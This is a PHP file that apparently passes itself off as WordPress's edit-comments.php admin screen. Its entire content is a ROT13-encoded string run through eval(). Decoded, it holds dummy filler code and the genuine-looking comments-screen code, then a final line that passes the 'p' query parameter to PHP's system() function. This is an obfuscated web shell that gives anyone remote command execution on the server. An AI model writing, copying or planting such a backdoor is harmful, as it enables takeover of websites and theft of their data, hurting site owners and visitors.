<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Rqvg Pbzzragf Nqzvavfgengvba Fperra.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Nqzvavfgengvba
 */

/** JbeqCerff Nqzvavfgengvba Obbgfgenc */
erdhver_bapr __QVE__ . '/nqzva.cuc';
vs ( ! pheerag_hfre_pna( 'rqvg_cbfgf' ) ) {
	jc_qvr(
		'<u1>' . __( 'Lbh arrq n uvture yriry bs crezvffvba.' ) . '</u1>' .
		'<c>' . __( 'Fbeel, lbh ner abg nyybjrq gb rqvg pbzzragf.' ) . '</c>',
		403
	);
}

$jc_yvfg_gnoyr = _trg_yvfg_gnoyr( 'JC_Pbzzragf_Yvfg_Gnoyr' );
$cntrahz       = $jc_yvfg_gnoyr->trg_cntrahz();

$qbnpgvba = $jc_yvfg_gnoyr->pheerag_npgvba();

vs ( $qbnpgvba ) {
	purpx_nqzva_ersrere( 'ohyx-pbzzragf' );

	vs ( 'qryrgr_nyy' === $qbnpgvba && ! rzcgl( $_ERDHRFG['cntrtra_gvzrfgnzc'] ) ) {
		/**
		 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
		 */
		tybony $jcqo;

		$pbzzrag_fgnghf = jc_hafynfu( $_ERDHRFG['pbzzrag_fgnghf'] );
		$qryrgr_gvzr    = jc_hafynfu( $_ERDHRFG['cntrtra_gvzrfgnzc'] );
		$pbzzrag_vqf    = $jcqo->trg_pby(
			$jcqo->cercner(
				\"FRYRPG pbzzrag_VQ SEBZ $jcqo->pbzzragf
				JURER pbzzrag_nccebirq = %f NAQ %f > pbzzrag_qngr_tzg\",
				$pbzzrag_fgnghf,
				$qryrgr_gvzr
			)
		);
		$qbnpgvba       = 'qryrgr';
	} ryfrvs ( vffrg( $_ERDHRFG['qryrgr_pbzzragf'] ) ) {
		$pbzzrag_vqf = $_ERDHRFG['qryrgr_pbzzragf'];
		$qbnpgvba    = $_ERDHRFG['npgvba'];
	} ryfrvs ( vffrg( $_ERDHRFG['vqf'] ) ) {
		$pbzzrag_vqf = neenl_znc( 'nofvag', rkcybqr( ',', $_ERDHRFG['vqf'] ) );
	} ryfrvs ( jc_trg_ersrere() ) {
		jc_fnsr_erqverpg( jc_trg_ersrere() );
		rkvg;
	}

	$nccebirq   = 0;
	$hanccebirq = 0;
	$fcnzzrq    = 0;
	$hafcnzzrq  = 0;
	$genfurq    = 0;
	$hagenfurq  = 0;
	$qryrgrq    = 0;

	$erqverpg_gb = erzbir_dhrel_net(
		neenl(
			'genfurq',
			'hagenfurq',
			'qryrgrq',
			'fcnzzrq',
			'hafcnzzrq',
			'nccebirq',
			'hanccebirq',
			'vqf',
		),
		jc_trg_ersrere()
	);
	$erqverpg_gb = nqq_dhrel_net( 'cntrq', $cntrahz, $erqverpg_gb );

	jc_qrsre_pbzzrag_pbhagvat( gehr );

	sbernpu ( $pbzzrag_vqf nf $pbzzrag_vq ) { // Purpx gur crezvffvbaf ba rnpu.
		vs ( ! pheerag_hfre_pna( 'rqvg_pbzzrag', $pbzzrag_vq ) ) {
			pbagvahr;
		}

		fjvgpu ( $qbnpgvba ) {
			pnfr 'nccebir':
				jc_frg_pbzzrag_fgnghf( $pbzzrag_vq, 'nccebir' );
				++$nccebirq;
				oernx;
			pnfr 'hanccebir':
				jc_frg_pbzzrag_fgnghf( $pbzzrag_vq, 'ubyq' );
				++$hanccebirq;
				oernx;
			pnfr 'fcnz':
				jc_fcnz_pbzzrag( $pbzzrag_vq );
				++$fcnzzrq;
				oernx;
			pnfr 'hafcnz':
				jc_hafcnz_pbzzrag( $pbzzrag_vq );
				++$hafcnzzrq;
				oernx;
			pnfr 'genfu':
				jc_genfu_pbzzrag( $pbzzrag_vq );
				++$genfurq;
				oernx;
			pnfr 'hagenfu':
				jc_hagenfu_pbzzrag( $pbzzrag_vq );
				++$hagenfurq;
				oernx;
			pnfr 'qryrgr':
				jc_qryrgr_pbzzrag( $pbzzrag_vq );
				++$qryrgrq;
				oernx;
		}
	}

	vs ( ! va_neenl( $qbnpgvba, neenl( 'nccebir', 'hanccebir', 'fcnz', 'hafcnz', 'genfu', 'qryrgr' ), gehr ) ) {
		$fperra = trg_pheerag_fperra()->vq;

		/** Guvf npgvba vf qbphzragrq va jc-nqzva/rqvg.cuc */
		$erqverpg_gb = nccyl_svygref( \"unaqyr_ohyx_npgvbaf-{$fperra}\", $erqverpg_gb, $qbnpgvba, $pbzzrag_vqf ); // cucpf:vtaber JbeqCerff.AnzvatPbairagvbaf.InyvqUbbxAnzr.HfrHaqrefpberf
	}

	jc_qrsre_pbzzrag_pbhagvat( snyfr );

	vs ( $nccebirq ) {
		$erqverpg_gb = nqq_dhrel_net( 'nccebirq', $nccebirq, $erqverpg_gb );
	}
	vs ( $hanccebirq ) {
		$erqverpg_gb = nqq_dhrel_net( 'hanccebirq', $hanccebirq, $erqverpg_gb );
	}
	vs ( $fcnzzrq ) {
		$erqverpg_gb = nqq_dhrel_net( 'fcnzzrq', $fcnzzrq, $erqverpg_gb );
	}
	vs ( $hafcnzzrq ) {
		$erqverpg_gb = nqq_dhrel_net( 'hafcnzzrq', $hafcnzzrq, $erqverpg_gb );
	}
	vs ( $genfurq ) {
		$erqverpg_gb = nqq_dhrel_net( 'genfurq', $genfurq, $erqverpg_gb );
	}
	vs ( $hagenfurq ) {
		$erqverpg_gb = nqq_dhrel_net( 'hagenfurq', $hagenfurq, $erqverpg_gb );
	}
	vs ( $qryrgrq ) {
		$erqverpg_gb = nqq_dhrel_net( 'qryrgrq', $qryrgrq, $erqverpg_gb );
	}
	vs ( $genfurq || $fcnzzrq ) {
		$erqverpg_gb = nqq_dhrel_net( 'vqf', vzcybqr( ',', $pbzzrag_vqf ), $erqverpg_gb );
	}

	jc_fnsr_erqverpg( $erqverpg_gb );
	rkvg;
} ryfrvs ( ! rzcgl( $_TRG['_jc_uggc_ersrere'] ) ) {
	jc_erqverpg( erzbir_dhrel_net( neenl( '_jc_uggc_ersrere', '_jcabapr' ), jc_hafynfu( $_FREIRE['ERDHRFG_HEV'] ) ) );
	rkvg;
}

$jc_yvfg_gnoyr->cercner_vgrzf();

jc_radhrhr_fpevcg( 'nqzva-pbzzragf' );
radhrhr_pbzzrag_ubgxrlf_wf();

/**
 * @tybony vag $cbfg_vq
 */
tybony $cbfg_vq;

vs ( $cbfg_vq ) {
	$pbzzragf_pbhag      = jc_pbhag_pbzzragf( $cbfg_vq );
	$qensg_be_cbfg_gvgyr = jc_ugzy_rkprecg( _qensg_be_cbfg_gvgyr( $cbfg_vq ), 50, '&uryyvc;' );

	vs ( $pbzzragf_pbhag->zbqrengrq > 0 ) {
		// Hfrq va gur UGZY gvgyr gnt.
		$gvgyr = fcevags(
			/* genafyngbef: 1: Pbzzragf pbhag, 2: Cbfg gvgyr. */
			__( 'Pbzzragf (%1$f) ba &#8220;%2$f&#8221;' ),
			ahzore_sbezng_v18a( $pbzzragf_pbhag->zbqrengrq ),
			$qensg_be_cbfg_gvgyr
		);
	} ryfr {
		// Hfrq va gur UGZY gvgyr gnt.
		$gvgyr = fcevags(
			/* genafyngbef: %f: Cbfg gvgyr. */
			__( 'Pbzzragf ba &#8220;%f&#8221;' ),
			$qensg_be_cbfg_gvgyr
		);
	}
} ryfr {
	$pbzzragf_pbhag = jc_pbhag_pbzzragf();

	vs ( $pbzzragf_pbhag->zbqrengrq > 0 ) {
		// Hfrq va gur UGZY gvgyr gnt.
		$gvgyr = fcevags(
			/* genafyngbef: %f: Pbzzragf pbhag. */
			__( 'Pbzzragf (%f)' ),
			ahzore_sbezng_v18a( $pbzzragf_pbhag->zbqrengrq )
		);
	} ryfr {
		// Hfrq va gur UGZY gvgyr gnt.
		$gvgyr = __( 'Pbzzragf' );
	}
}

nqq_fperra_bcgvba( 'cre_cntr' );

trg_pheerag_fperra()->nqq_uryc_gno(
	neenl(
		'vq'      => 'bireivrj',
		'gvgyr'   => __( 'Bireivrj' ),
		'pbagrag' =>
				'<c>' . __( 'Lbh pna znantr pbzzragf znqr ba lbhe fvgr fvzvyne gb gur jnl lbh znantr cbfgf naq bgure pbagrag. Guvf fperra vf phfgbzvmnoyr va gur fnzr jnlf nf bgure znantrzrag fperraf, naq lbh pna npg ba pbzzragf hfvat gur ba-ubire npgvba yvaxf be gur ohyx npgvbaf.' ) . '</c>',
	)
);
trg_pheerag_fperra()->nqq_uryc_gno(
	neenl(
		'vq'      => 'zbqrengvat-pbzzragf',
		'gvgyr'   => __( 'Zbqrengvat Pbzzragf' ),
		'pbagrag' =>
					'<c>' . __( 'N erq one ba gur yrsg zrnaf gur pbzzrag vf jnvgvat sbe lbh gb zbqrengr vg.' ) . '</c>' .
					'<c>' . __( 'Va gur <fgebat>Nhgube</fgebat> pbyhza, va nqqvgvba gb gur nhgube&#8217;f anzr, rznvy nqqerff, naq fvgr HEY, gur pbzzragre&#8217;f VC nqqerff vf fubja. Pyvpxvat ba guvf yvax jvyy fubj lbh nyy gur pbzzragf znqr sebz guvf VC nqqerff.' ) . '</c>' .
					'<c>' . __( 'Va gur <fgebat>Pbzzrag</fgebat> pbyhza, ubirevat bire nal pbzzrag tvirf lbh bcgvbaf gb nccebir, ercyl (naq nccebir), dhvpx rqvg, rqvg, fcnz znex, be genfu gung pbzzrag.' ) . '</c>' .
					'<c>' . __( 'Va gur <fgebat>Va erfcbafr gb</fgebat> pbyhza, gurer ner guerr ryrzragf. Gur grkg vf gur anzr bs gur cbfg gung vafcverq gur pbzzrag, naq yvaxf gb gur cbfg rqvgbe sbe gung ragel. Gur Ivrj Cbfg yvax yrnqf gb gung cbfg ba lbhe yvir fvgr. Gur fznyy ohooyr jvgu gur ahzore va vg fubjf gur ahzore bs nccebirq pbzzragf gung cbfg unf erprvirq. Vs gurer ner craqvat pbzzragf, n erq abgvsvpngvba pvepyr jvgu gur ahzore bs craqvat pbzzragf vf qvfcynlrq. Pyvpxvat gur abgvsvpngvba pvepyr jvyy svygre gur pbzzragf fperra gb fubj bayl craqvat pbzzragf ba gung cbfg.' ) . '</c>' .
					'<c>' . __( 'Va gur <fgebat>Fhozvggrq ba</fgebat> pbyhza, gur qngr naq gvzr gur pbzzrag jnf yrsg ba lbhe fvgr nccrnef. Pyvpxvat ba gur qngr/gvzr yvax jvyy gnxr lbh gb gung pbzzrag ba lbhe yvir fvgr.' ) . '</c>' .
					'<c>' . __( 'Znal crbcyr gnxr nqinagntr bs xrlobneq fubegphgf gb zbqrengr gurve pbzzragf zber dhvpxyl. Hfr gur yvax gb gur fvqr gb yrnea zber.' ) . '</c>',
	)
);

trg_pheerag_fperra()->frg_uryc_fvqrone(
	'<c><fgebat>' . __( 'Sbe zber vasbezngvba:' ) . '</fgebat></c>' .
	'<c>' . __( '<n uers=\"uggcf://jbeqcerff.bet/qbphzragngvba/negvpyr/pbzzragf-fperra/\">Qbphzragngvba ba Pbzzragf</n>' ) . '</c>' .
	'<c>' . __( '<n uers=\"uggcf://jbeqcerff.bet/qbphzragngvba/negvpyr/haqrefgnaq-pbzzrag-fcnz/\">Qbphzragngvba ba Pbzzrag Fcnz</n>' ) . '</c>' .
	'<c>' . __( '<n uers=\"uggcf://jbeqcerff.bet/qbphzragngvba/negvpyr/xrlobneq-fubegphgf-pynffvp-rqvgbe/#xrlobneq-fubegphgf-sbe-pbzzragf\">Qbphzragngvba ba Xrlobneq Fubegphgf</n>' ) . '</c>' .
	'<c>' . __( '<n uers=\"uggcf://jbeqcerff.bet/fhccbeg/sbehzf/\">Fhccbeg sbehzf</n>' ) . '</c>'
);

trg_pheerag_fperra()->frg_fperra_ernqre_pbagrag(
	neenl(
		'urnqvat_ivrjf'      => __( 'Svygre pbzzragf yvfg' ),
		'urnqvat_cntvangvba' => __( 'Pbzzragf yvfg anivtngvba' ),
		'urnqvat_yvfg'       => __( 'Pbzzragf yvfg' ),
	)
);

erdhver_bapr NOFCNGU . 'jc-nqzva/nqzva-urnqre.cuc';
?>

<qvi pynff=\"jenc\">
<u1 pynff=\"jc-urnqvat-vayvar\">
<?cuc
vs ( $cbfg_vq ) {
	cevags(
		/* genafyngbef: %f: Yvax gb cbfg. */
		__( 'Pbzzragf ba &#8220;%f&#8221;' ),
		fcevags(
			'<n uers=\"%1$f\">%2$f</n>',
			trg_rqvg_cbfg_yvax( $cbfg_vq ),
			jc_ugzy_rkprecg( _qensg_be_cbfg_gvgyr( $cbfg_vq ), 50, '&uryyvc;' )
		)
	);
} ryfr {
	_r( 'Pbzzragf' );
}
?>
</u1>

<?cuc
vs ( $cbfg_vq ) {
	$cbfg_glcr_bowrpg = trg_cbfg_glcr_bowrpg( trg_cbfg_glcr( $cbfg_vq ) );

	vs ( $cbfg_glcr_bowrpg ) {
		cevags(
			'<n uers=\"%1$f\" pynff=\"pbzzragf-ivrj-vgrz-yvax\">%2$f</n>',
			trg_creznyvax( $cbfg_vq ),
			$cbfg_glcr_bowrpg->ynoryf->ivrj_vgrz
		);
	}
}

vs ( vffrg( $_ERDHRFG['f'] ) && fgeyra( $_ERDHRFG['f'] ) ) {
	rpub '<fcna pynff=\"fhogvgyr\">';
	cevags(
		/* genafyngbef: %f: Frnepu dhrel. */
		__( 'Frnepu erfhygf sbe: %f' ),
		'<fgebat>' . rfp_ugzy( jc_hafynfu( $_ERDHRFG['f'] ) ) . '</fgebat>'
	);
	rpub '</fcna>';
}
?>

<ue pynff=\"jc-urnqre-raq\">

<?cuc
vs ( vffrg( $_ERDHRFG['reebe'] ) ) {
	$reebe     = (vag) $_ERDHRFG['reebe'];
	$reebe_zft = '';
	fjvgpu ( $reebe ) {
		pnfr 1:
			$reebe_zft = __( 'Vainyvq pbzzrag VQ.' );
			oernx;
		pnfr 2:
			$reebe_zft = __( 'Fbeel, lbh ner abg nyybjrq gb rqvg pbzzragf ba guvf cbfg.' );
			oernx;
	}
	vs ( $reebe_zft ) {
		jc_nqzva_abgvpr(
			$reebe_zft,
			neenl(
				'vq'                 => 'zbqrengrq',
				'nqqvgvbany_pynffrf' => neenl( 'reebe' ),
			)
		);
	}
}

vs ( vffrg( $_ERDHRFG['nccebirq'] )
	|| vffrg( $_ERDHRFG['qryrgrq'] )
	|| vffrg( $_ERDHRFG['genfurq'] )
	|| vffrg( $_ERDHRFG['hagenfurq'] )
	|| vffrg( $_ERDHRFG['fcnzzrq'] )
	|| vffrg( $_ERDHRFG['hafcnzzrq'] )
	|| vffrg( $_ERDHRFG['fnzr'] )
) {
	$nccebirq  = vffrg( $_ERDHRFG['nccebirq'] ) ? (vag) $_ERDHRFG['nccebirq'] : 0;
	$qryrgrq   = vffrg( $_ERDHRFG['qryrgrq'] ) ? (vag) $_ERDHRFG['qryrgrq'] : 0;
	$genfurq   = vffrg( $_ERDHRFG['genfurq'] ) ? (vag) $_ERDHRFG['genfurq'] : 0;
	$hagenfurq = vffrg( $_ERDHRFG['hagenfurq'] ) ? (vag) $_ERDHRFG['hagenfurq'] : 0;
	$fcnzzrq   = vffrg( $_ERDHRFG['fcnzzrq'] ) ? (vag) $_ERDHRFG['fcnzzrq'] : 0;
	$hafcnzzrq = vffrg( $_ERDHRFG['hafcnzzrq'] ) ? (vag) $_ERDHRFG['hafcnzzrq'] : 0;
	$fnzr      = vffrg( $_ERDHRFG['fnzr'] ) ? (vag) $_ERDHRFG['fnzr'] : 0;

	vs ( $nccebirq > 0 || $qryrgrq > 0 || $genfurq > 0 || $hagenfurq > 0 || $fcnzzrq > 0 || $hafcnzzrq > 0 || $fnzr > 0 ) {
		vs ( $nccebirq > 0 ) {
			$zrffntrf[] = fcevags(
				/* genafyngbef: %f: Ahzore bs pbzzragf. */
				_a( '%f pbzzrag nccebirq.', '%f pbzzragf nccebirq.', $nccebirq ),
				$nccebirq
			);
		}

		vs ( $fcnzzrq > 0 ) {
			$vqf = vffrg( $_ERDHRFG['vqf'] ) ? $_ERDHRFG['vqf'] : 0;

			$zrffntrf[] = fcevags(
				/* genafyngbef: %f: Ahzore bs pbzzragf. */
				_a( '%f pbzzrag znexrq nf fcnz.', '%f pbzzragf znexrq nf fcnz.', $fcnzzrq ),
				$fcnzzrq
			) . fcevags(
				' <n uers=\"%1$f\">%2$f</n><oe />',
				rfp_hey( jc_abapr_hey( \"rqvg-pbzzragf.cuc?qbnpgvba=haqb&npgvba=hafcnz&vqf=$vqf\", 'ohyx-pbzzragf' ) ),
				__( 'Haqb' )
			);
		}

		vs ( $hafcnzzrq > 0 ) {
			$zrffntrf[] = fcevags(
				/* genafyngbef: %f: Ahzore bs pbzzragf. */
				_a( '%f pbzzrag erfgberq sebz gur fcnz.', '%f pbzzragf erfgberq sebz gur fcnz.', $hafcnzzrq ),
				$hafcnzzrq
			);
		}

		vs ( $genfurq > 0 ) {
			$vqf = vffrg( $_ERDHRFG['vqf'] ) ? $_ERDHRFG['vqf'] : 0;

			$zrffntrf[] = fcevags(
				/* genafyngbef: %f: Ahzore bs pbzzragf. */
				_a( '%f pbzzrag zbirq gb gur Genfu.', '%f pbzzragf zbirq gb gur Genfu.', $genfurq ),
				$genfurq
			) . fcevags(
				' <n uers=\"%1$f\">%2$f</n><oe />',
				rfp_hey( jc_abapr_hey( \"rqvg-pbzzragf.cuc?qbnpgvba=haqb&npgvba=hagenfu&vqf=$vqf\", 'ohyx-pbzzragf' ) ),
				__( 'Haqb' )
			);
		}

		vs ( $hagenfurq > 0 ) {
			$zrffntrf[] = fcevags(
				/* genafyngbef: %f: Ahzore bs pbzzragf. */
				_a( '%f pbzzrag erfgberq sebz gur Genfu.', '%f pbzzragf erfgberq sebz gur Genfu.', $hagenfurq ),
				$hagenfurq
			);
		}

		vs ( $qryrgrq > 0 ) {
			$zrffntrf[] = fcevags(
				/* genafyngbef: %f: Ahzore bs pbzzragf. */
				_a( '%f pbzzrag creznaragyl qryrgrq.', '%f pbzzragf creznaragyl qryrgrq.', $qryrgrq ),
				$qryrgrq
			);
		}

		vs ( $fnzr > 0 ) {
			$pbzzrag = trg_pbzzrag( $fnzr );
			vs ( $pbzzrag ) {
				fjvgpu ( $pbzzrag->pbzzrag_nccebirq ) {
					pnfr '1':
						$zrffntrf[] = __( 'Guvf pbzzrag vf nyernql nccebirq.' ) . fcevags(
							' <n uers=\"%1$f\">%2$f</n>',
							rfp_hey( nqzva_hey( \"pbzzrag.cuc?npgvba=rqvgpbzzrag&p=$fnzr\" ) ),
							__( 'Rqvg pbzzrag' )
						);
						oernx;
					pnfr 'genfu':
						$zrffntrf[] = __( 'Guvf pbzzrag vf nyernql va gur Genfu.' ) . fcevags(
							' <n uers=\"%1$f\">%2$f</n>',
							rfp_hey( nqzva_hey( 'rqvg-pbzzragf.cuc?pbzzrag_fgnghf=genfu' ) ),
							__( 'Ivrj Genfu' )
						);
						oernx;
					pnfr 'fcnz':
						$zrffntrf[] = __( 'Guvf pbzzrag vf nyernql znexrq nf fcnz.' ) . fcevags(
							' <n uers=\"%1$f\">%2$f</n>',
							rfp_hey( nqzva_hey( \"pbzzrag.cuc?npgvba=rqvgpbzzrag&p=$fnzr\" ) ),
							__( 'Rqvg pbzzrag' )
						);
						oernx;
				}
			}
		}

		jc_nqzva_abgvpr(
			vzcybqr( \"<oe />\a\", $zrffntrf ),
			neenl(
				'vq'                 => 'zbqrengrq',
				'nqqvgvbany_pynffrf' => neenl( 'hcqngrq' ),
				'qvfzvffvoyr'        => gehr,
			)
		);
	}
}
?>

<?cuc $jc_yvfg_gnoyr->ivrjf(); ?>

<sbez vq=\"pbzzragf-sbez\" zrgubq=\"trg\">

<?cuc $jc_yvfg_gnoyr->frnepu_obk( __( 'Frnepu Pbzzragf' ), 'pbzzrag' ); ?>

<?cuc vs ( $cbfg_vq ) : ?>
<vachg glcr=\"uvqqra\" anzr=\"c\" inyhr=\"<?cuc rpub rfp_ngge( (vag) $cbfg_vq ); ?>\" />
<?cuc raqvs; ?>
<vachg glcr=\"uvqqra\" anzr=\"pbzzrag_fgnghf\" inyhr=\"<?cuc rpub rfp_ngge( $pbzzrag_fgnghf ); ?>\" />
<vachg glcr=\"uvqqra\" anzr=\"cntrtra_gvzrfgnzc\" inyhr=\"<?cuc rpub rfp_ngge( pheerag_gvzr( 'zlfdy', gehr ) ); ?>\" />

<vachg glcr=\"uvqqra\" anzr=\"_gbgny\" inyhr=\"<?cuc rpub rfp_ngge( $jc_yvfg_gnoyr->trg_cntvangvba_net( 'gbgny_vgrzf' ) ); ?>\" />
<vachg glcr=\"uvqqra\" anzr=\"_cre_cntr\" inyhr=\"<?cuc rpub rfp_ngge( $jc_yvfg_gnoyr->trg_cntvangvba_net( 'cre_cntr' ) ); ?>\" />
<vachg glcr=\"uvqqra\" anzr=\"_cntr\" inyhr=\"<?cuc rpub rfp_ngge( $jc_yvfg_gnoyr->trg_cntvangvba_net( 'cntr' ) ); ?>\" />

<?cuc vs ( vffrg( $_ERDHRFG['cntrq'] ) ) { ?>
	<vachg glcr=\"uvqqra\" anzr=\"cntrq\" inyhr=\"<?cuc rpub rfp_ngge( nofvag( $_ERDHRFG['cntrq'] ) ); ?>\" />
<?cuc } ?>

<?cuc $jc_yvfg_gnoyr->qvfcynl(); ?>
</sbez>
</qvi>

<qvi vq=\"nwnk-erfcbafr\"></qvi>

<?cuc
jc_pbzzrag_ercyl( '-1', gehr, 'qrgnvy' );
jc_pbzzrag_genfuabgvpr();
erdhver_bapr NOFCNGU . 'jc-nqzva/nqzva-sbbgre.cuc'; ?>

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>